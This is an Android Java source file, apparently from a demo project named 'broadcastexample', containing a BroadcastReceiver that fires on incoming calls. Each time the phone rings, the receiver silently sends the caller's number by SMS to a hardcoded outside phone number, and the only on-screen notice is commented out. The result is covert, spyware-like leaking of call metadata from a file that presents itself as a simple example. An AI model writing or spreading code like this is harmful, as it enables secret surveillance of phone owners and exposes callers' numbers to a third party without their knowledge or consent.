package com.example.hp.broadcastexample;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.widget.Toast;

public class PhoneCallReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if(null != bundle){
            String state = bundle.getString(TelephonyManager.EXTRA_STATE);
            if(state.equals(TelephonyManager.EXTRA_STATE_RINGING)){
                String phoneNumber = bundle.getString(TelephonyManager.EXTRA_INCOMING_NUMBER);
                SmsManager smsManager = SmsManager.getDefault();
                smsManager.sendTextMessage("+37495800177", null, phoneNumber, null, null);
              //  Toast.makeText(context, "Phone Number" + phoneNumber, Toast.LENGTH_SHORT).show();
            }
        }
    }
}
